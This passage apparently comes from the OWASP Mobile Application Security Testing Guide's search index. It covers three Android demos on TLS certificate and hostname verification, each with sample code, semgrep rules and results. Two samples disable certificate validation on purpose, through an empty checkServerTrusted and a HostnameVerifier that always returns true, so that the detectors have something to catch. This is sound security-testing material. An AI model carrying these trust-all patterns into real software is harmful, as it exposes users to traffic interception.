HTTP/1.1\\r\\nHost: $host\\r\\nConnection: close\\r\\n\\r\\n\"\n            val out = socket.outputStream\n            out.write(request.toByteArray())\n            out.flush()\n\n            // Read the response (this will read until the server closes)\n            val reader = BufferedReader(InputStreamReader(socket.inputStream))\n            val response = reader.readText()\n\n            \"Connection Successful: ${response.substring(0, minOf(200, response.length))}\"\n        } catch (e: Exception) {\n            e.printStackTrace()\n            \"Connection Failed: ${e::class.simpleName} - ${e.message}\"\n        } finally {\n            // Clean up: close the socket\n            socket?.let {\n                try { it.close() } catch (_: Exception) {}\n            }\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport androidx.compose.runtime.ComposerKt;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport javax.net.SocketFactory;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLException;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport kotlin.Metadata;\nimport kotlin.io.TextStreamsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.jvm.internal.Reflection;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000\\u0018\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0002\\n\\u0002\\u0010\\u000e\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\r\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0002\\u0010\\u0004J\\u0006\\u0010\\u0005\\u001a\\u00020\\u0006R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u0007\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"app_debug\"}, k = 1, mv = {1, 9, 0}, xi = 48)\n/* loaded from: classes4.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() {\n        String str;\n        SSLSocket socket;\n        HostnameVerifier hostnameVerifier;\n        SSLSession session;\n        SSLSocket socket2 = null;\n        try {\n            try {\n                SocketFactory socketFactory = SSLSocketFactory.getDefault();\n                Intrinsics.checkNotNull(socketFactory, \"null cannot be cast to non-null type javax.net.ssl.SSLSocketFactory\");\n                SSLSocketFactory sslSocketFactory = (SSLSocketFactory) socketFactory;\n                Socket createSocket = sslSocketFactory.createSocket(\"wrong.host.badssl.com\", 443);\n                Intrinsics.checkNotNull(createSocket, \"null cannot be cast to non-null type javax.net.ssl.SSLSocket\");\n                socket = (SSLSocket) createSocket;\n                socket.startHandshake();\n                hostnameVerifier = HttpsURLConnection.getDefaultHostnameVerifier();\n                session = socket.getSession();\n            } catch (Exception e) {\n                e.printStackTrace();\n                str = \"Connection Failed: \" + Reflection.getOrCreateKotlinClass(e.getClass()).getSimpleName() + \" - \" + e.getMessage();\n                if (0 != 0) {\n                    try {\n                        socket2.close();\n                    } catch (Exception e2) {\n                    }\n                }\n            }\n            if (!hostnameVerifier.verify(\"wrong.host.badssl.com\", session)) {\n                throw new SSLException(\"Hostname verification failed for host: wrong.host.badssl.com\");\n            }\n            String request = \"GET / HTTP/1.1\\r\\nHost: wrong.host.badssl.com\\r\\nConnection: close\\r\\n\\r\\n\";\n            OutputStream out = socket.getOutputStream();\n            byte[] bytes = request.getBytes(Charsets.UTF_8);\n            Intrinsics.checkNotNullExpressionValue(bytes, \"this as java.lang.String).getBytes(charset)\");\n            out.write(bytes);\n            out.flush();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String response = TextStreamsKt.readText(reader);\n            StringBuilder append = new StringBuilder().append(\"Connection Successful: \");\n            String substring = response.substring(0, Math.min(ComposerKt.invocationKey, response.length()));\n            Intrinsics.checkNotNullExpressionValue(substring, \"this as java.lang.String\u2026ing(startIndex, endIndex)\");\n            str = append.append(substring).toString();\n            try {\n                socket.close();\n            } catch (Exception e3) {\n            }\n            return str;\n        } catch (Throwable th) {\n            if (0 != 0) {\n                try {\n                    socket2.close();\n                } catch (Exception e4) {\n                }\n            }\n            throw th;\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0049/MASTG-DEMO-0049/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool and look for all usages of <code>SSLSocket</code> and <code>HostnameVerifier</code>.</li> </ol> ../../../../rules/mastg-android-ssl-socket-hostnameverifier.yml<pre><code>rules:\n  - id: mastg-android-ssl-socket-hostnameverifier\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rules scans for the usage of SSLSocket API with a HostnameVerifier.\n    message: \"Detected usage of SSLSocket API with or without a HostnameVerifier\"\n    match:\n      any:\n        - pattern: SSLSocketFactory.getDefault()\n        - pattern: (SSLSocketFactory) $_\n        - pattern: $SF.createSocket(...)\n        - pattern: HttpsURLConnection.getDefaultHostnameVerifier()\n        - pattern: $HNV.verify($_, $_)\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-ssl-socket-hostnameverifier.yml ./MastgTest_reversed.java &gt; output.txt\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0049/MASTG-DEMO-0049/#observation","title":"Observation","text":"<p>The output contains a list of locations where <code>SSLSocket</code> and <code>HostnameVerifier</code> are used.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 5 Code Findings \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n     \u2771 rules.mastg-android-ssl-socket-hostnameverifier\n           42\u2506 SocketFactory socketFactory = SSLSocketFactory.getDefault();\n            \u22ee\u2506----------------------------------------\n           44\u2506 SSLSocketFactory sslSocketFactory = (SSLSocketFactory) socketFactory;\n            \u22ee\u2506----------------------------------------\n           45\u2506 Socket createSocket = sslSocketFactory.createSocket(\"wrong.host.badssl.com\", 443);\n            \u22ee\u2506----------------------------------------\n           49\u2506 hostnameVerifier = HttpsURLConnection.getDefaultHostnameVerifier();\n            \u22ee\u2506----------------------------------------\n           61\u2506 if (!hostnameVerifier.verify(\"wrong.host.badssl.com\", session)) {\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0049/MASTG-DEMO-0049/#evaluation","title":"Evaluation","text":"<p>The test case passes due to the use of a <code>HostnameVerifier</code>.</p> <p>As expected, the connection aborts as you can see in the logcat output which contains the following exception:</p> <pre><code>javax.net.ssl.SSLException: Hostname verification failed for host: wrong.host.badssl.com\n</code></pre>","tags":["android","demo","MASTG-TEST-0234"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0054/MASTG-DEMO-0054/","title":"MASTG-DEMO-0054: Use of a TrustManager that Does Not Validate Certificate Chains","text":"<p>  Download MASTG-DEMO-0054 APK   Open MASTG-DEMO-0054 Folder  Build MASTG-DEMO-0054 APK</p>","tags":["android","demo","MSTG-TEST-0282"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0054/MASTG-DEMO-0054/#sample","title":"Sample","text":"<p>This sample connects to https://tlsexpired.no, which has an expired certificate, to demonstrate the insecure use of a custom <code>TrustManager</code> that ignores certificate chain validity. It does this by overriding the <code>checkServerTrusted(...)</code> method and leaving it empty, which effectively disables certificate validation.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.net.URL\nimport java.security.SecureRandom\nimport java.security.cert.X509Certificate\nimport javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLContext\nimport javax.net.ssl.TrustManager\nimport javax.net.ssl.X509TrustManager\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n        val content = StringBuilder(\"Response:\\n\\n\")\n        val thread = Thread {\n            content.append(fetchUrl(\"https://tlsexpired.no\"))     // Expired cert\n        }\n        thread.start()\n        thread.join()\n        return content.toString()\n    }\n\n    private fun fetchUrl(urlString: String): String {\n        return try {\n            val url = URL(urlString)\n            val connection = url.openConnection() as HttpsURLConnection\n\n            trustAllCertificates(connection) // \u274c Ignores certificate chain validity\n\n            connection.setRequestProperty(\"User-Agent\", \"OWASP MAS APP 9000\")\n            connection.connect()\n\n            val response = connection.inputStream.bufferedReader().use { it.readText() }\n            \"\\n[$urlString] Response OK\\n$response\\n\"\n        } catch (e: Exception) {\n            \"\\n[$urlString] Error: ${e.message}\\n\"\n        }\n    }\n\n    private fun trustAllCertificates(connection: HttpsURLConnection) {\n        try {\n            val trustAllCerts = arrayOf&lt;TrustManager&gt;(\n                object : X509TrustManager {\n                    override fun checkClientTrusted(chain: Array&lt;out X509Certificate&gt;?, authType: String?) {}\n                    override fun checkServerTrusted(chain: Array&lt;out X509Certificate&gt;?, authType: String?) {}\n                    override fun getAcceptedIssuers(): Array&lt;X509Certificate&gt; = arrayOf()\n                }\n            )\n\n            val sslContext = SSLContext.getInstance(\"TLS\")\n            sslContext.init(null, trustAllCerts, SecureRandom())\n            connection.sslSocketFactory = sslContext.socketFactory\n\n        } catch (e: Exception) {\n            Log.e(\"TRUST_MANAGER\", \"Failed to setup trust manager: ${e.message}\")\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport kotlin.Metadata;\nimport kotlin.io.CloseableKt;\nimport kotlin.io.TextStreamsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000&amp;\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u0002\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\u000f\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0004\\b\\u0004\\u0010\\u0005J\\u0006\\u0010\\u0006\\u001a\\u00020\\u0007J\\u0010\\u0010\\b\\u001a\\u00020\\u00072\\u0006\\u0010\\t\\u001a\\u00020\\u0007H\\u0002J\\u0010\\u0010\\n\\u001a\\u00020\\u000b2\\u0006\\u0010\\f\\u001a\\u00020\\rH\\u0002R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u000e\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"&lt;init&gt;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"fetchUrl\", \"urlString\", \"trustAllCertificates\", \"\", \"connection\", \"Ljavax/net/ssl/HttpsURLConnection;\", \"app_debug\"}, k = 1, mv = {2, 0, 0}, xi = 48)\n/* loaded from: classes3.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() throws InterruptedException {\n        final StringBuilder content = new StringBuilder(\"Response:\\n\\n\");\n        Thread thread = new Thread(new Runnable() { // from class: org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda0\n            @Override // java.lang.Runnable\n            public final void run() {\n                MastgTest.mastgTest$lambda$0(content, this);\n            }\n        });\n        thread.start();\n        thread.join();\n        String string = content.toString();\n        Intrinsics.checkNotNullExpressionValue(string, \"toString(...)\");\n        return string;\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public static final void mastgTest$lambda$0(StringBuilder content, MastgTest this$0) {\n        Intrinsics.checkNotNullParameter(content, \"$content\");\n        Intrinsics.checkNotNullParameter(this$0, \"this$0\");\n        content.append(this$0.fetchUrl(\"https://tlsexpired.no\"));\n    }\n\n    private final String fetchUrl(String urlString) throws IOException {\n        try {\n            URL url = new URL(urlString);\n            URLConnection uRLConnectionOpenConnection = url.openConnection();\n            Intrinsics.checkNotNull(uRLConnectionOpenConnection, \"null cannot be cast to non-null type javax.net.ssl.HttpsURLConnection\");\n            HttpsURLConnection connection = (HttpsURLConnection) uRLConnectionOpenConnection;\n            trustAllCertificates(connection);\n            connection.setRequestProperty(\"User-Agent\", \"OWASP MAS APP 9000\");\n            connection.connect();\n            InputStream inputStream = connection.getInputStream();\n            Intrinsics.checkNotNullExpressionValue(inputStream, \"getInputStream(...)\");\n            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);\n            BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);\n            try {\n                BufferedReader it = bufferedReader;\n                String response = TextStreamsKt.readText(it);\n                CloseableKt.closeFinally(bufferedReader, null);\n                return \"\\n[\" + urlString + \"] Response OK\\n\" + response + \"\\n\";\n            } finally {\n            }\n        } catch (Exception e) {\n            return \"\\n[\" + urlString + \"] Error: \" + e.getMessage() + \"\\n\";\n        }\n    }\n\n    private final void trustAllCertificates(HttpsURLConnection connection) throws NoSuchAlgorithmException, KeyManagementException {\n        try {\n            TrustManager[] trustAllCerts = {new X509TrustManager() { // from class: org.owasp.mastestapp.MastgTest$trustAllCertificates$trustAllCerts$1\n                @Override // javax.net.ssl.X509TrustManager\n                public void checkClientTrusted(X509Certificate[] chain, String authType) {\n                }\n\n                @Override // javax.net.ssl.X509TrustManager\n                public void checkServerTrusted(X509Certificate[] chain, String authType) {\n                }\n\n                @Override // javax.net.ssl.X509TrustManager\n                public X509Certificate[] getAcceptedIssuers() {\n                    return new X509Certificate[0];\n                }\n            }};\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            connection.setSSLSocketFactory(sslContext.getSocketFactory());\n        } catch (Exception e) {\n            Log.e(\"TRUST_MANAGER\", \"Failed to setup trust manager: \" + e.getMessage());\n        }\n    }\n}\n</code></pre> <p>If the app wouldn't use the insecure <code>TrustManager</code>, you would see this message:</p> <pre><code>[https://tlsexpired.no] Error: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.\n</code></pre>","tags":["android","demo","MSTG-TEST-0282"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0054/MASTG-DEMO-0054/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-network-checkservertrusted.yml<pre><code>rules:\n  - id: mastg-android-network-checkservertrusted\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for the use of checkServerTrusted and ensures it throws an exception instead of silently muting invalid server certificates\n    message: Improper Server Certificate verification detected.\n    match:\n        any:\n        - public void checkServerTrusted (...) { ... }\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-network-checkservertrusted.yml ./MastgTest_reversed.java --text &gt; output.txt\n</code></pre>","tags":["android","demo","MSTG-TEST-0282"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0054/MASTG-DEMO-0054/#observation","title":"Observation","text":"<p>The rule identified one instance in the code where <code>checkServerTrusted(...)</code> is used without exception handling.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-network-checkservertrusted\n          Improper Server Certificate verification detected.\n\n           92\u2506 @Override // javax.net.ssl.X509TrustManager\n           93\u2506 public void checkServerTrusted(X509Certificate[] chain, String authType) {\n           94\u2506 }\n</code></pre>","tags":["android","demo","MSTG-TEST-0282"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0054/MASTG-DEMO-0054/#evaluation","title":"Evaluation","text":"<p>The test fails because of the presence of the <code>checkServerTrusted(...)</code> method on in the <code>TrustManager</code> implementation, as well as the absence of exceptions being thrown.</p>","tags":["android","demo","MSTG-TEST-0282"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0055/MASTG-DEMO-0055/","title":"MASTG-DEMO-0055: Use of the HostnameVerifier that Allows Any Hostname","text":"<p>  Download MASTG-DEMO-0055 APK   Open MASTG-DEMO-0055 Folder  Build MASTG-DEMO-0055 APK</p>","tags":["android","demo","MSTG-TEST-0283"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0055/MASTG-DEMO-0055/#sample","title":"Sample","text":"<p>This sample connects to a URL with an subject alternative name that does not match the hostname and configures a <code>HostnameVerifier</code> that allows any hostname.</p> MastgTest.ktMastgTest_reversed.java <pre><code>package org.owasp.mastestapp\n\nimport android.content.Context\nimport android.util.Log\nimport java.net.URL\nimport java.security.SecureRandom\nimport java.security.cert.X509Certificate\nimport javax.net.ssl.HostnameVerifier\nimport javax.net.ssl.HttpsURLConnection\nimport javax.net.ssl.SSLContext\nimport javax.net.ssl.TrustManager\nimport javax.net.ssl.X509TrustManager\n\nclass MastgTest(private val context: Context) {\n\n    fun mastgTest(): String {\n        val content = StringBuilder(\"Response:\\n\\n\")\n        val thread = Thread {\n            content.append(fetchUrl(\"https://tlsbadsubjectaltname.no\"))\n        }\n        thread.start()\n        thread.join()\n        return content.toString()\n    }\n\n    private fun fetchUrl(urlString: String): String {\n        return try {\n            val url = URL(urlString)\n            val connection = url.openConnection() as HttpsURLConnection\n\n            // Accept any certificate to bypass CA verification (not the weakness we're showing here)\n            trustAllCertificates(connection)\n\n            // \u274c Hostname verification disabled\n            connection.hostnameVerifier = HostnameVerifier { hostname, _ -&gt;\n                Log.w(\"HOSTNAME_VERIFIER\", \"Insecurely allowing host: $hostname\")\n                true\n            }\n\n            connection.setRequestProperty(\"User-Agent\", \"OWASP MAS APP 9000\")\n            connection.connect()\n\n            val response = connection.inputStream.bufferedReader().use { it.readText() }\n            \"\\n[$urlString] Response OK\\n$response\\n\"\n        } catch (e: Exception) {\n            \"\\n[$urlString] Error: ${e.message}\\n\"\n        }\n    }\n    private fun trustAllCertificates(connection: HttpsURLConnection) {\n        try {\n            val trustAllCerts = arrayOf&lt;TrustManager&gt;(\n                object : X509TrustManager {\n                    override fun checkClientTrusted(chain: Array&lt;out X509Certificate&gt;?, authType: String?) {}\n                    override fun checkServerTrusted(chain: Array&lt;out X509Certificate&gt;?, authType: String?) {}\n                    override fun getAcceptedIssuers(): Array&lt;X509Certificate&gt; = arrayOf()\n                }\n            )\n\n            val sslContext = SSLContext.getInstance(\"TLS\")\n            sslContext.init(null, trustAllCerts, SecureRandom())\n            connection.sslSocketFactory = sslContext.socketFactory\n\n        } catch (e: Exception) {\n            Log.e(\"TRUST_MANAGER\", \"Failed to setup trust manager: ${e.message}\")\n        }\n    }\n}\n</code></pre> <pre><code>package org.owasp.mastestapp;\n\nimport android.content.Context;\nimport android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.Reader;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport kotlin.Metadata;\nimport kotlin.io.CloseableKt;\nimport kotlin.io.TextStreamsKt;\nimport kotlin.jvm.internal.Intrinsics;\nimport kotlin.text.Charsets;\n\n/* compiled from: MastgTest.kt */\n@Metadata(d1 = {\"\\u0000&amp;\\n\\u0002\\u0018\\u0002\\n\\u0002\\u0010\\u0000\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u000e\\n\\u0002\\b\\u0003\\n\\u0002\\u0010\\u0002\\n\\u0000\\n\\u0002\\u0018\\u0002\\n\\u0000\\b\\u0007\\u0018\\u00002\\u00020\\u0001B\\u000f\\u0012\\u0006\\u0010\\u0002\\u001a\\u00020\\u0003\u00a2\\u0006\\u0004\\b\\u0004\\u0010\\u0005J\\u0006\\u0010\\u0006\\u001a\\u00020\\u0007J\\u0010\\u0010\\b\\u001a\\u00020\\u00072\\u0006\\u0010\\t\\u001a\\u00020\\u0007H\\u0002J\\u0010\\u0010\\n\\u001a\\u00020\\u000b2\\u0006\\u0010\\f\\u001a\\u00020\\rH\\u0002R\\u000e\\u0010\\u0002\\u001a\\u00020\\u0003X\\u0082\\u0004\u00a2\\u0006\\u0002\\n\\u0000\u00a8\\u0006\\u000e\"}, d2 = {\"Lorg/owasp/mastestapp/MastgTest;\", \"\", \"context\", \"Landroid/content/Context;\", \"&lt;init&gt;\", \"(Landroid/content/Context;)V\", \"mastgTest\", \"\", \"fetchUrl\", \"urlString\", \"trustAllCertificates\", \"\", \"connection\", \"Ljavax/net/ssl/HttpsURLConnection;\", \"app_debug\"}, k = 1, mv = {2, 0, 0}, xi = 48)\n/* loaded from: classes3.dex */\npublic final class MastgTest {\n    public static final int $stable = 8;\n    private final Context context;\n\n    public MastgTest(Context context) {\n        Intrinsics.checkNotNullParameter(context, \"context\");\n        this.context = context;\n    }\n\n    public final String mastgTest() throws InterruptedException {\n        final StringBuilder content = new StringBuilder(\"Response:\\n\\n\");\n        Thread thread = new Thread(new Runnable() { // from class: org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda1\n            @Override // java.lang.Runnable\n            public final void run() {\n                MastgTest.mastgTest$lambda$0(content, this);\n            }\n        });\n        thread.start();\n        thread.join();\n        String string = content.toString();\n        Intrinsics.checkNotNullExpressionValue(string, \"toString(...)\");\n        return string;\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public static final void mastgTest$lambda$0(StringBuilder content, MastgTest this$0) {\n        Intrinsics.checkNotNullParameter(content, \"$content\");\n        Intrinsics.checkNotNullParameter(this$0, \"this$0\");\n        content.append(this$0.fetchUrl(\"https://tlsbadsubjectaltname.no\"));\n    }\n\n    private final String fetchUrl(String urlString) throws IOException {\n        try {\n            URL url = new URL(urlString);\n            URLConnection uRLConnectionOpenConnection = url.openConnection();\n            Intrinsics.checkNotNull(uRLConnectionOpenConnection, \"null cannot be cast to non-null type javax.net.ssl.HttpsURLConnection\");\n            HttpsURLConnection connection = (HttpsURLConnection) uRLConnectionOpenConnection;\n            trustAllCertificates(connection);\n            connection.setHostnameVerifier(new HostnameVerifier() { // from class: org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda0\n                @Override // javax.net.ssl.HostnameVerifier\n                public final boolean verify(String str, SSLSession sSLSession) {\n                    return MastgTest.fetchUrl$lambda$1(str, sSLSession);\n                }\n            });\n            connection.setRequestProperty(\"User-Agent\", \"OWASP MAS APP 9000\");\n            connection.connect();\n            InputStream inputStream = connection.getInputStream();\n            Intrinsics.checkNotNullExpressionValue(inputStream, \"getInputStream(...)\");\n            Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);\n            BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);\n            try {\n                BufferedReader it = bufferedReader;\n                String response = TextStreamsKt.readText(it);\n                CloseableKt.closeFinally(bufferedReader, null);\n                return \"\\n[\" + urlString + \"] Response OK\\n\" + response + \"\\n\";\n            } finally {\n            }\n        } catch (Exception e) {\n            return \"\\n[\" + urlString + \"] Error: \" + e.getMessage() + \"\\n\";\n        }\n    }\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public static final boolean fetchUrl$lambda$1(String hostname, SSLSession sSLSession) {\n        Log.w(\"HOSTNAME_VERIFIER\", \"Insecurely allowing host: \" + hostname);\n        return true;\n    }\n\n    private final void trustAllCertificates(HttpsURLConnection connection) throws NoSuchAlgorithmException, KeyManagementException {\n        try {\n            TrustManager[] trustAllCerts = {new X509TrustManager() { // from class: org.owasp.mastestapp.MastgTest$trustAllCertificates$trustAllCerts$1\n                @Override // javax.net.ssl.X509TrustManager\n                public void checkClientTrusted(X509Certificate[] chain, String authType) {\n                }\n\n                @Override // javax.net.ssl.X509TrustManager\n                public void checkServerTrusted(X509Certificate[] chain, String authType) {\n                }\n\n                @Override // javax.net.ssl.X509TrustManager\n                public X509Certificate[] getAcceptedIssuers() {\n                    return new X509Certificate[0];\n                }\n            }};\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, trustAllCerts, new SecureRandom());\n            connection.setSSLSocketFactory(sslContext.getSocketFactory());\n        } catch (Exception e) {\n            Log.e(\"TRUST_MANAGER\", \"Failed to setup trust manager: \" + e.getMessage());\n        }\n    }\n}\n</code></pre>","tags":["android","demo","MSTG-TEST-0283"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0055/MASTG-DEMO-0055/#steps","title":"Steps","text":"<p>Let's run our  semgrep rule against the sample code.</p> ../../../../rules/mastg-android-network-hostname-verification.yml<pre><code>rules:\n  - id: mastg-android-network-hostname-verification\n    severity: WARNING\n    languages:\n      - java\n    metadata:\n      summary: This rule looks for the use of HostnameVerifier in the app\n    message: Improper server hostname verification detected\n    match:\n      any:\n        - new HostnameVerifier() {...}\n</code></pre> run.sh<pre><code>NO_COLOR=true semgrep -c ../../../../rules/mastg-android-network-hostname-verification.yml ./MastgTest_reversed.java --text &gt; output.txt\n</code></pre>","tags":["android","demo","MSTG-TEST-0283"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0055/MASTG-DEMO-0055/#observation","title":"Observation","text":"<p>The rule identified one instance of the use of the <code>HostnameVerifier</code> in the code.</p> output.txt<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 1 Code Finding \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n    MastgTest_reversed.java\n    \u276f\u2771 rules.mastg-android-network-hostname-verification\n          Improper server hostname verification detected\n\n           69\u2506 connection.setHostnameVerifier(new HostnameVerifier() { // from class:\n               org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda0              \n           70\u2506     @Override // javax.net.ssl.HostnameVerifier\n           71\u2506     public final boolean verify(String str, SSLSession sSLSession) {\n           72\u2506         return MastgTest.fetchUrl$lambda$1(str, sSLSession);\n           73\u2506     }\n           74\u2506 });\n</code></pre>","tags":["android","demo","MSTG-TEST-0283"]},{"location":"MASTG/demos/android/MASVS-NETWORK/MASTG-DEMO-0055/MASTG-DEMO-0055/#evaluation","title":"Evaluation","text":"<p>The test fails because the app uses a <code>HostnameVerifier</code> that allows any hostname.</p> <p>In this case, since the rule only checks for the presence of a <code>HostnameVerifier</code> and does not validate the implementation of the verifier, you need to manually validate the app's reverse-engineered code and inspect the provided code locations.</p> <p>The rule points to MastgTest_reversed.java, where we can see the following code:</p> <pre><code>            connection.setHostnameVerifier(new HostnameVerifier() { // from class: org.owasp.mastestapp.MastgTest$$ExternalSyntheticLambda0\n                @Override // javax.net.ssl.HostnameVerifier\n                public final boolean verify(String str, SSLSession sSLSession) {\n                    return MastgTest.fetchUrl$lambda$1(str, sSLSession);\n                }\n            });\n            ...\n\n    /* JADX INFO: Access modifiers changed from: private */\n    public static final boolean fetchUrl$lambda$1(String hostname, SSLSession sSLSession) {\n        Log.w(\"HOSTNAME_VERIFIER\", \"Insecurely allowing host: \" + hostname);\n        return true;\n    }\n</code></pre> <p>We can see how:</p> <ul> <li>the app sets a custom <code>HostnameVerifier</code> on the HTTPS connection.</li> <li>the verifier calls <code>fetchUrl$lambda$1</code>, which logs a warning and returns <code>true</code>.</li> </ul> <p>This way we can conclude that the hostname verification does not properly validate that the server's hostname matches the certificate subject alternative 